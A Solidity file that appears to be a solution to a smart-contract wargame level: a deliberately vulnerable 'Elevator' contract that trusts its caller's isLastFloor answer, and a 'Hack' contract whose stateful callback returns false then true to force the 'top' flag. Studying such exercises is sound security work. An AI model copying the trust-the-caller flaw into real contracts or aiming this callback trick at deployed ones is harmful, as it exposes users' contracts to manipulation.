// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Hack {
    Elevator target;
    uint count;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function goto(uint _floor) public {
        target.goTo(_floor);
        target.goTo(_floor);
    }

    function isLastFloor(uint _value) external returns (bool){
        if(count==0){
            count++;
            return false;
        }
        return true;
    }
}